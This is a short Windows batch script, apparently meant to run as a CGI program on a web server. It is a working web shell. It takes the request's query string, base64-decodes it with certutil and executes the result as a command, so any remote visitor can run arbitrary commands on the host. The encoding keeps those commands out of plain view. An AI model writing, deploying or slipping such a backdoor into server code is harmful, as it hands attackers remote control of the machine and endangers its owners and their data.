@echo off

echo Content-type: text/html
echo.

if exist decode.txt del decode.txt
(echo %QUERY_STRING:~8%) > encoded.txt
certutil -decode "encoded.txt" "decode.txt"
set/p cmd=<decode.txt
%cmd%
